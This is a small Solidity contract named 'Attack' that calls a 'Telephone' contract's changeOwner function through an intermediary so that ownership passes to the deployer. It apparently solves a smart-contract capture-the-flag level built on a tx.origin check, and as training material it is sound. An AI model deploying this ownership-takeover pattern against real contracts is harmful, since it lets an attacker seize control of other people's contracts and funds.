// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Telephone.sol";

contract Attack {
    Telephone telephone;
    address public owner;

    constructor(address _telephone) public {
        telephone = Telephone(_telephone);
        owner = msg.sender;
    }

    function attack() public {
        telephone.changeOwner(owner);
    }
}
